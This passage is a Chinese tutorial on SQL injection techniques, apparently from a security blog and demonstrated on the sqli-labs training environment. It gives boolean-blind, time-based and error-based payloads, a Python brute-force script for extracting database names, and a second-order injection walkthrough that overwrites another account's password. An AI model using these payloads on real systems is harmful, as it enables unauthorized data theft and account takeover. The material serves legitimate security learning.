<p>其中，3，5，7不是必要的，直接爆对应的名称，设置一个足够大小的循环即可。但是为了更好的写脚本，还是推荐在爆破前先判断长度。</p>
<p>接下来首先介绍需要用到的函数，然后按照步骤一一说明。<strong>所有演示都在sqli-labs第8关。</strong></p>
<h3 id="需要用到的函数-1">2.4.1. 需要用到的函数</h3>
<h4 id="length">2.4.1.1. length()</h4>
<p><strong>作用：用于判断字符串长度。</strong></p>
<p>语法: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str)</span><br></pre></td></tr></table></figure></p>
<p>一般使用： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(database())&gt;4</span><br></pre></td></tr></table></figure></p>
<p>判断数据库长度是否超过4，如果超过，这条语句的结果位真，否则为假。</p>
<p><strong>注意：这里的符号可以是&gt;, &lt;, =, !=</strong></p>
<h4 id="substr-substring-mid">2.4.1.2. substr(), substring(), mid()</h4>
<p><strong>作用：用于截取字符串。</strong></p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr(str, pos[, len])</span><br><span class="line">substring(str, pos[, len])</span><br><span class="line">mid(str, pos[, len])</span><br></pre></td></tr></table></figure></p>
<p>注意：MySQL中截取的时候字符串是从1开始的！因此pos最小值为1。</p>
<h4 id="left-right-substring_index">2.4.1.3. left(), right(), substring_index()</h4>
<p><strong>作用：用于截取字符串。</strong></p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">left(str, len) # 从最左端开始，截取len长度的字符串</span><br><span class="line">right(str, len) # 从最右端开始，截取len长度的字符串</span><br><span class="line">substring_index(str, substr, count) # 截取str中第count个chr前面的所有字符</span><br></pre></td></tr></table></figure></p>
<h4 id="ascii-ord">2.4.1.4. ascii(), ord()</h4>
<p><strong>作用：将字符转为ascii码，注意是十进制的。</strong></p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(char)</span><br><span class="line">ord(char)</span><br></pre></td></tr></table></figure></p>
<p>一般使用：(配合字符串截取函数) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))&gt;100</span><br><span class="line">ord(mid(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：这里的符号可以是&gt;, &lt;, =, !=</strong></p>
<h4 id="limit-poslen">2.4.1.5. limit pos,len</h4>
<p><strong>作用：从pos位置开始，读取len行信息。</strong></p>
<p>我们都知道，如果直接输入<code>select * from users;</code>会返回多行信息，但是如果使用limit关键字，就能够人为控制返回多少行信息，返回哪几行信息。</p>
<p>演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424100523.png" /></p>
<p>也可以看出，使用该关键词，位置是从0开始的，和substr等截取字符串的函数的开始位置不同。</p>
<p><strong>主要的作用就是用来替代group_concat()。如果回显位只有一位，而返回结果有多行的时候就可以使用group_concat()将所有结果拼接成一个字符串，然后进行返回。当然也可以使用limit关键词，只返回自己需要的那一行数据。</strong></p>
<h3 id="判断数据库长度">2.4.2. 判断数据库长度</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or length(database())&gt;7--+</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090503.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or length(database())&gt;8--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090452.png" /></p>
<p>当&gt;7的时候，页面显示正常；当&gt;8的时候，页面显示异常。从而判断数据的长度应该为7。</p>
<p>为了保险，可以用'='进行一次验证。</p>
<h3 id="爆数据库名">2.4.3. 爆数据库名</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or substr(database(),1,1)=&#x27;s&#x27;--+</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))=115--+ # 利用ascii函数是为了写脚本的时候更好的循环。</span><br></pre></td></tr></table></figure></p>
<p>解释：利用字符串截取函数，每次截取一个字符，然后爆破这个字符是什么；然后继续爆破下一个字符，直到所有字符都爆破完就能够知道数据库名称了。可以下一个简单的脚本代替，如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line">dbName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://3df26cde-054d-4730-9653-feb19f34a60a.node4.buuoj.cn/Less-8/?id=-1&#x27; or ascii(substr(database(),%d,1))=%d-- &quot;</span> <span class="comment"># 使用脚本的时候别用+，直接使用空格就好</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbLen+<span class="number">1</span>): <span class="comment"># dbLen 为上一步得到的数据库长度</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>): <span class="comment"># ascii码从0-127，但是0是结束符，数据库名中一般不会有，其实32之前的都不太可能会有</span></span><br><span class="line">		payload = url % (i, j)</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		time.sleep(<span class="number">0.3</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text: <span class="comment"># 判断页面是否正常</span></span><br><span class="line">			dbName += <span class="built_in">chr</span>(j) <span class="comment"># 将ascii码转为字符</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of dbName is : %s&quot;</span> % <span class="built_in">chr</span>(j))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the dbName is : %s&quot;</span> % dbName)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424093426.png" /></p>
<p>之后的所有步骤都建议写一个脚本帮忙跑。</p>
<h3 id="爆数据库下group_concattable_name的长度">2.4.4. 爆数据库下group_concat(table_name)的长度</h3>
<p>常规padload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+ </span><br><span class="line"></span><br><span class="line"># 注意括号，因为length(str)，所以要把length函数中的语句返回的结果当作整体，故使用括号包住</span><br></pre></td></tr></table></figure></p>
<h3 id="爆对应数据库下的所有表名">2.4.5. 爆对应数据库下的所有表名</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<h3 id="爆对应表下的group_concatcolumn_name的长度">2.4.6. 爆对应表下的group_concat(column_name)的长度</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;))=29--+ </span><br></pre></td></tr></table></figure></p>
<h3 id="爆对应表下的所有字段名">2.4.7. 爆对应表下的所有字段名</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<h3 id="爆对应字段的group_concatcolumnname的长度">2.4.8. 爆对应字段的group_concat(columnName)的长度</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; or length((select group_concat(columnName)from dtabaseName.tableName))=55--+</span><br></pre></td></tr></table></figure></p>
<h3 id="爆对应字段的信息">2.4.9. 爆对应字段的信息</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(columnName)from databaseName.tableName),1,1))=68--+</span><br></pre></td></tr></table></figure></p>
<h2 id="时间盲注">2.5. 时间盲注</h2>
<p>时间盲注原理同布尔盲注，不过条件更宽，时间盲注可以不需要“根据参数的真假返回的页面有差异”这一条件。只需要存在SQL注入漏洞即可。</p>
<p>主要步骤同布尔盲注。</p>
<h3 id="需要用到的函数-2">2.5.1. 需要用到的函数</h3>
<h4 id="if">2.5.1.1. if()</h4>
<p><strong>作用：根据条件的真假，执行不同的语句</strong></p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition, a, b)</span><br></pre></td></tr></table></figure></p>
<p>解释：如果condition为真，那么<strong>返回</strong>a，否则<strong>返回</strong>b。</p>
<h4 id="sleep">2.5.1.2. sleep()</h4>
<p><strong>作用：延迟时间</strong></p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(x)</span><br></pre></td></tr></table></figure></p>
<p>解释：延迟x秒。</p>
<p>一般与if配合使用， <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition, sleep(3),sleep(5))</span><br></pre></td></tr></table></figure></p>
<p>condition可以为布尔盲注中的payload，如果payload为真，那么就会延迟3秒之后返回页面，否则，延迟5秒之后返回页面。这样子，就可以根据数据包的返回时间判断输入的payload正确与否。</p>
<h3 id="过程">2.5.2. 过程</h3>
<p>过程和布尔盲注一样，这里简单说明一下常规的payload即可。</p>
<ol type="1">
<li>判断数据库长度； <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())=8),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li>
<li>爆数据库名； <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))=115),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li>
<li>爆对应数据库下的group_concat(table_name)的长度；</li>
<li>爆对应数据库下的所有表名；</li>
<li>爆对应表下的group_concat(column_name)的长度；</li>
<li>爆对应表下的所有字段名</li>
<li>爆对应字段的group_concat(columnName)的长度；</li>
<li>爆对应字段的信息；</li>
</ol>
<p>这里只演示了前两个，其他也类似，直接将布尔盲注中的or后面的payload作为if的条件语句即可。</p>
<p>解释：<code>?id=1' and if((length(database())=8),sleep(5),1)--+</code>，如果if中的条件语句为真，那么此时语句就会变成<code>?id=1' and sleep(5)--+</code>因为前面是1，是真的，从而执行后面的语句，也就是延迟5秒。如果if中的条件为假，此时语句为<code>?id=1' and 1--+</code>前后都为真，直接返回结果，不会有任何延迟。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424102801.png" /></p>
<p>需要注意： 1. 时间盲注中要使用and，我测试or的不行。 2. 使用and要注意id那里就需要一个数据库中存在的id，因为<code>condition1 and condition2</code>中如果前者为false，那么后者就不会被判断，因为无论后者是什么，整个世子的结果都是false。</p>
<h2 id="报错注入">2.6. 报错注入</h2>
<p><strong>原理：主要是利用某些函数，当这些函数的某个参数错误时，就会报出对应的错误信息。</strong></p>
<p>报错注入的使用条件是：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p>
<p>常见的有四种：</p>
<ul>
<li>exp</li>
<li>updatexml, extractvalue</li>
<li>floor+rand</li>
</ul>
<p>步骤与布尔盲注类似，只不过因为这里通过报错回显，所以不需要去计算长度的信息。</p>
<h3 id="exp">2.6.1. exp()</h3>
<p><strong>作用：该函数计算以e为底的指数函数的值，在MySQL中，当参数大于709时就会报错</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424195335.png" /></p>
<p>因此，一般的利用方式就是 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(709+condition)</span><br></pre></td></tr></table></figure></p>
<p>如果condition为真，那么此时的式子为exp(710)因此会报错；反之，如果condition为假，难么此时exp(709)并不会报错。</p>
<p>与exp()类似的还有cot()和pow()。其中cot为三角函数，如果参数为0则会报错；pow()为指数函数，pow(a,b)就是求a的b次方，pow()当参数过大时也会报错，因此两者的利用方式可以为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cot(condition)</span><br><span class="line">	condition=1 -&gt; cot(1)</span><br><span class="line">	condition=0 -&gt; cot(0)</span><br><span class="line"></span><br><span class="line">pow(condition,9999)</span><br><span class="line">	condition=1 -&gt; pow(1,9999)=1</span><br><span class="line">	condition=0 -&gt; pow(0,9999)=0</span><br></pre></td></tr></table></figure></p>
<p>高版本MySQL已经修复该漏洞</p>
<h3 id="updatexml-extractvalue">2.6.2. updatexml(), extractvalue()</h3>
<p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：updatexml(), extractvalue()，当两个文档执行时，如果出现xml文档路径错误就会产生报错。</p>
<h4 id="updatexml">2.6.2.1. updatexml()</h4>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML_document, XPath_string, new_value)</span><br></pre></td></tr></table></figure></p>
<p>解释：当XPath出现错误的时候，则会爆出错误信息。</p>
<p>使用： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,database()),0) # 其他两个参数随便填，0x7e表示的是~</span><br></pre></td></tr></table></figure></p>
<p>最后就会将concat(0x7e,database())给爆出来，也就是~databaseName。</p>
<h4 id="extractvalue">2.6.2.2. extractvalue()</h4>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document, XPath_string)</span><br></pre></td></tr></table></figure></p>
<p>解释：当XPath出现错误的时候，则会爆出错误信息。</p>
<p>使用： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure></p>
<p>最后就会将concat(0x7e,database())给爆出来，也就是~databaseName。</p>
<h3 id="floor-rand">2.6.3. floor(), rand()</h3>
<h4 id="floor">2.6.3.1. floor()</h4>
<p>floor(): 向下取整</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424200853.png" /></p>
<h4 id="rand">2.6.3.2. rand()</h4>
<p>rand(): 产生<code>[0,1)</code> 的随机数。有两种形式</p>
<ul>
<li>rand(): 无参数，此时产生的随机数是随机的，不可重复的；</li>
<li>rand(x): 有参数，相当于指定随机数生产的种子，那么这种情况产生的随机数是可重复的；</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424201435.png" /></p>
<p>可以看到，带入相同参数的得到的值是一样的，而没带入参数的值是不一样的。因此，只要带入一样的参数，那么返回的值就是相同的！</p>
<h4 id="两者配合">2.6.3.3. 两者配合</h4>
<p>常用的语句： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">select count(*), concat((select version()), floor(rand()*2))a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure></p>
<p>因为rand()的值为<code>[0,1)</code>，那么<code>rand()*2=[0,2)</code>，因此<code>floor(rand()*2)=0 or 1</code>。</p>
<p>（需要一定的运气）这里就需要用到group by的特性[[#group by]]。当group_concat和rand一起使用时，过程如下：</p>
<ol type="1">
<li>先计算<code>group by a</code>，假设此时<code>group by databaseName1</code>，表中没有该主键，因此会将该主键插入，这里需要注意，在插入之前会再次计算一下rand()，假设再次计算为databaseName0，那么真正插入表中的主键就是databaseName0；</li>
<li>取第二条消息时，假设第一次计算出的为databaseName1，判断表中没有该主键，准备插入，在插入之前再次计算，此时得databaseName0，也就是插入的主键为databaseName0，但是该主键已经存在了，所以就报错了。</li>
</ol>
<p>注意：</p>
<ol type="1">
<li>我这里只是假设计算两次，实际计算多少次并不知道，但一定&gt;=2次；</li>
<li>运气不好可能并不会出现这样的情况，需要多试几次</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205332.png" /></p>
<p>看，第一次就没触发。</p>
<h1 id="非常规注入方法">3. 非常规注入方法</h1>
<h2 id="加解密注入">3.1. 加解密注入</h2>
<p>这个比较简单。一般来说，参数都是明文传递的，比如说：<code>?id=1</code>，当然，也有时候参数进行了简单的加密，比如base64编码，那么此时为<code>?id=MQ==</code>，到了服务器后在进行解码。这种情况下我们所有的payload都需要先按照服务器的加密当时加密，然后再传入。</p>
<h2 id="dnslog注入">3.2. DNSlog注入</h2>
<h2 id="二次注入">3.3. 二次注入</h2>
<p>原理：二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。详细点来讲，就是在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞的。</p>
<p>原理图如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424213751.png" /></p>
<p>过程：</p>
<ol type="1">
<li>插入恶意数据：第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容</li>
<li>引用恶意数据：在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</li>
</ol>
<p>思路：</p>
<ol type="1">
<li>通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令；</li>
<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应；</li>
<li>向服务端发送第二个与第一次不相同的请求数据信息；</li>
<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行；</li>
<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功；</li>
</ol>
<p>题目：[[Sqlilabs-less-24]]</p>
<p>打开网页看到一个登陆界面，输入admin/admin后是修改密码的界面。改密码涉及到对数据库的记录进行替换，我们怀疑此处有一个 UPDATE 语句。</p>
<p>在任何界面进行注入应该都是无效的，因为操作失败时会跳转到其他页面，而没有任何例如错误的回显信息。此处考虑的就不是之前那些把敏感信息弄出来的注入了，而是考虑利用改密码操作夺取其他账号的控制权，此处我们考虑二次注入。</p>
<ol type="1">
<li>首先我们构造一个特殊的用户，该用户的用户名为 “batman'#”，密码随便设。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214307.png" /></p>
<ol start="2" type="1">
<li>登录刚刚注册的用户，注意，此时的用户名还是 batman'#</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214458.png" /></p>
<ol start="3" type="1">
<li>修改密码为999999，然后查看数据库中的信息，发现batman的密码被修改了，而batman'#的没有被修改</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214548.png" /></p>
<p>我们查看源码： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update users set password=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p>而我们修改密码的操作传入的参数为: ?username=batman'#&amp;pass=999999，此时的后台语句变为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update users set password=&#x27;999999&#x27; where username=&#x27;batman&#x27;#&#x27; and password=&#x27;123456&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p><code>#</code>后面的语句都被注释，真正带入数据库查询的语句为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;999999&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;batman&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>因此修改了batman用户的密码。</p>
<h2 id="二次查询注入">3.4. 二次查询注入</h2>
<h3 id="原理">3.4.1. 原理</h3>
<p>假设后台进行了两次数据库查询，语句分别为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res1</span> = <span class="string">&quot;select * from baseinfo where id = <span class="subst">$id</span> limit 0,1&quot;</span>; <span class="comment"># $id 为用户输入</span></span><br><span class="line"><span class="variable">$res2</span> = <span class="string">&quot;select * from users where username = &#x27;.<span class="subst">$res</span>[1].&#x27; limit 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res2</span>; <span class="comment"># 瞎写的这句</span></span><br></pre></td></tr></table></figure></p>
<p>如果我们输入正常的id，那么第一句话就会得到一个结果： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// res1 是一个数组</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| id   | username | email         |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">|    1 | admin    | admin@163.com |</span><br><span class="line">+------+----------+---------------+</span><br></pre></td></tr></table></figure></p>
<p>那么此时<code>$res[1]=admin</code>，那么第二句话就能得到 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------+----------+----------+-------+</span><br><span class="line">| id   | username | password | camp  |</span><br><span class="line">+------+----------+----------+-------+</span><br><span class="line">|    1 | admin    | admin    | admin |</span><br><span class="line">+------+----------+----------+-------+</span><br></pre></td></tr></table></figure></p>
<p>此时再进行后续的操作。</p>
<p>经过这样的两次操作，虽然说sql注入还是存在，但是很难被发现。那么该如何注入呢？下面进行说明。 ### 3.4.2. 利用 题目为数字型。</p>
<p>一般来说，我们会输入如下payload来判断回显位 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | 2        | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>假如我们知道username字段所在的位置是第二个，那么，输入如下命令： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 正常的后台会利用limit只回显一条信息</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | admin    | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>虽然是二次查询，但是第二次查询也只是简单的查询罢了，如果返回的结果中的username的值能够被控制，即如果我们能够让返回的信息变成下面的样子，那其实也只是简单的SQL注入罢了。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | payload  | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>那该如何实现了，select 或者 union select 此时不能够简单的： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,admin<span class="string">&#x27;,3,4 from users;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>select 和 union select后面要么跟上数字，要么跟上字段名，如果要想随便跟上一个字符串，需要用引号括起来。</p>
</blockquote>
<p>这里其实有两种办法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. select * from users where id = -1 union select 1,0x61646d696e27,3,4 from users;</span><br><span class="line">2. select * from users where id = -1 union select 1,&quot;admin&#x27;&quot;,3,4 from users;</span><br></pre></td></tr></table></figure></p>
<p>第一种是将admin'进行16进制编码，第二种就是简单的用括号括起来。结果是一样的。</p>
<blockquote>
<p>个人理解：16进制会被当作就是数字，从而不会报错。要明确<strong>我们需要的不是全数字，而是特殊意义的数字</strong>。为什么不用其他进制的原因是10，2进制前面什么都不加，8进制前面是数字0，所有字符转成这三种进制都是纯数字。而16进制前面有0x会被识别成16进制。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426204540.png" /></p>
